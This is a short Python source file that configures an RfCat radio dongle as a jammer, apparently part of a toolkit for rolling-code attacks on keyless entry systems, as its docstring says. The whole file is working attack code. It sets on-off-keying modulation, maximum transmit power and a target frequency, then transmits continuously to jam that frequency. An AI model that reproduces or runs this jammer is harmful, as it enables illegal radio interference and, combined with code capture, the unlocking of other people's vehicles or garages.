from rflib import *


def setupJammer(idx_value, rf_settings):
    '''Used to setup jammer with second card for a Rolling Code attack or single for other attacks'''
    j = RfCat(idx=idx_value)
    j.setMdmModulation(MOD_ASK_OOK)
    j.setMdmDRate(rf_settings.baud_rate)# how long each bit is transmited for
    j.setMdmChanBW(60000)# how wide channel is
    j.setMdmChanSpc(rf_settings.channel_spacing)
    j.setMaxPower()
    #j.setRFRegister(PA_TABLE0, 0xFF)
    #j.setRFRegister(PA_TABLE1, 0xFF)
    j.setRFRegister(PKTCTRL1, 0xFF)
    j.setChannel(0)
    return j

def jamming(j, action, rf_settings, rolling_code, jamming_variance=0):
    frequency = rf_settings.frequency + jamming_variance
    j.setFreq(frequency)

    if (action == "start"):
        print "Starting Jamming on: " + str(frequency)
        j.setModeTX() # start transmitting
        if not rolling_code:
            raw_input("Enter to stop jamming")
            print 'done'
            j.setModeIDLE()
    if (action == "stop"):
        j.setModeIDLE() # put dongle in idle mode to stop jamming
        print "Jamming Stopped"
